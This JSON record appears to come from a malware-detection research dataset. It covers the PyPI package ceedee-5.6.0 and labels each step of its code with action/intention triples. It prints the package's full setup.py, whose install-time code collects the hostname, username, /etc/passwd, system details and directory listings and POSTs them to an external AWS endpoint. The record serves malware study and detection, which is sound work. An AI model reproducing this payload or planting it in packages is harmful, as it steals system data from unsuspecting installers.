{
  "metadata": {
    "package_name": "ceedee-5.6.0",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/ceedee-5.6.0.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/ceedee-5.6.0.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport platform\nfrom urllib import request, parse\n\nos_name = platform.system()\ndata = {}\nif os_name == 'Linux' or os_name == 'Darwin':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        passwd_file = os.popen('cat /etc/passwd').read()\n        os_info = os.popen('uname -a').read()\n        curr_dir = os.popen(\"pwd\").read()\n        list_curr_dir = os.popen(\"ls -la\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Password File': passwd_file,\n            'OS Information': os_info,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelif os_name == 'Windows':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        curr_dir = os.popen(\"cd\").read()\n        list_curr_dir = os.popen(\"dir\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelse:\n    data = {'Error': 'Cannot determine OS'}\n\ndata_enc = parse.urlencode(data).encode()\nAPI_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\nreq = request.Request(API_ENDPOINT, data=data_enc)\nres = request.urlopen(req)\n",
          "triple_sequences": [
            {
              "action_api": "platform.system()",
              "action_description": "Retrieves operating system identifier",
              "action_id": "get_os_id",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Determine operating system",
              "intention_id": "determine_operating_system"
            },
            {
              "action_api": "os.popen()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "hostname",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "os.popen().read()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "whoami",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "os.popen().read()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "cat /etc/passwd",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "os.popen().read()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "uname -a",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "os.popen().read()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "pwd",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Collect working directory",
              "intention_id": "collect_working_directory"
            },
            {
              "action_api": "os.popen().read()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "ls -la",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.popen().read()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "cd",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Collect working directory",
              "intention_id": "collect_working_directory"
            },
            {
              "action_api": "os.popen().read()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "dir",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "parse.urlencode()",
              "action_description": "Encodes mapping object to URL query string",
              "action_id": "encode_url_query",
              "object": "data",
              "object_description": "String containing environment data",
              "object_id": "string_environment_data",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "bytes.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "request.Request()",
              "action_description": "Creates HTTP request object with specified URL, data, and headers",
              "action_id": "create_http_request",
              "object": "API_ENDPOINT, data=data_enc",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "request.urlopen()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "req",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            }
          ]
        }
      ]
    }
  ]
}